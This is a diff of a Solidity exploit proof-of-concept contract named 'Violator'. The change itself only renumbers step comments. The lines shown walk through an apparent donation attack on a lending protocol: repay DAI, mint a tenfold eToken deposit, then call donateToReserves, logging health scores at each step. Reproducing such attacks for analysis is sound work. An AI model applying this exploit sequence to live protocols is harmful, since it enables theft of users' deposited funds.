@@ -51,18 +51,19 @@ contract Violator {
         emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
         console.log(" ");
 
-        // 4. Repay 10M DAI
+        // 5. Repay 10M DAI
         dDAI.repay(0, 10_000_000 * 1e18);
         MARKETS.getUserAsset("After repaying (violator): ", address(eDAI), address(this));
         emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
         console.log(" ");
-        // 5. Mint 10 x deposit again
+        
+        // 6. Mint 10 x deposit again
         eDAI.mint(0, 200_000_000 * 1e18);
         MARKETS.getUserAsset("After minting (violator): ", address(eDAI), address(this));
         emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
         console.log(" ");
         
-        // 6. Donate 100M DAI
+        // 7. Donate 100M DAI
         eDAI.donateToReserves(0, 100_000_000 * 1e18);
         MARKETS.getUserAsset("After donating (violator): ", address(eDAI), address(this));
         emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
